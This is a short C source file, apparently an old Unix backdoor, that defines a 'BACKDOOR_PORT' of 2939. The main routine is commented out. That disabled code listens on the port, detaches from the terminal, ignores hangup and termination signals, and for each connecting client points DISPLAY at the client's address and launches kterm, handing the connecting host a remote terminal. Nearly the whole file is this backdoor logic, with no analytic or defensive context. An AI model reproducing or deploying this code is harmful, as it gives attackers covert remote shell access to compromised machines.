#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <fcntl.h>
#include <signal.h>

#define BACKDOOR_PORT "2939"

void func(void)
{
  signal(SIGHUP, func);
  signal(SIGTERM, func);
}


void pwait(void)
{
  int status;

  wait(&status);
}


void main(argc, argv)
int argc;
char **argv;
{
    /*
  struct sockaddr_in server, client;
  char host_a[512], proxy_port[512];
  char *argv0[128];
  int s, new_s, pid;
  int cl_len;
  unsigned int a, b, c, d;

  signal(SIGHUP, func);
  signal(SIGTERM, func);
  signal(SIGCHLD, pwait);
  if(argc < 2) {
    strcpy(proxy_port, BACKDOOR_PORT);
  } else {
    strcpy(proxy_port, argv[1]);
  }

  if((s=socket(AF_INET, SOCK_STREAM, 0))== -1){
    exit(1);
  }

  bzero((char *) &server, sizeof(server));
  server.sin_family = AF_INET;
  server.sin_addr.s_addr=INADDR_ANY;
  server.sin_port=htons(atoi(proxy_port));
  if(bind(s, &server, sizeof(server))== -1) {
    exit(1);
  }

  if(listen(s,5)== -1) {
    exit(1);
  }

  if(fork() != 0)
    exit(0);
  fclose(stdin);
  fclose(stdout);
  fclose(stderr);

  for (;;){
    cl_len = sizeof(client);
    if ((new_s = accept(s, &client, &cl_len)) == -1){
      continue;
    } else {
      close(new_s);
      if ((pid = fork()) == -1) {
        exit(1);
      } else if (pid == 0) {
        fclose(stdin);
        fclose(stdout);
        fclose(stderr);
        close(s);
        a = ((unsigned int)(client.sin_addr.s_addr)) >> 24;
        b = (((unsigned int)(client.sin_addr.s_addr)) >> 16) & 0xff;
        c = (((unsigned int)(client.sin_addr.s_addr)) >> 8) & 0xff;
        d = ((unsigned int)(client.sin_addr.s_addr)) & 0xff;
        sprintf(host_a, "DISPLAY=%u.%u.%u.%u:0", a, b, c, d);
        putenv(host_a);
        argv0[0] = "kterm";
        execl("/usr/X11R6.3/bin/kterm",argv0,NULL);
        exit(0);
      }
    }
  }
  */
}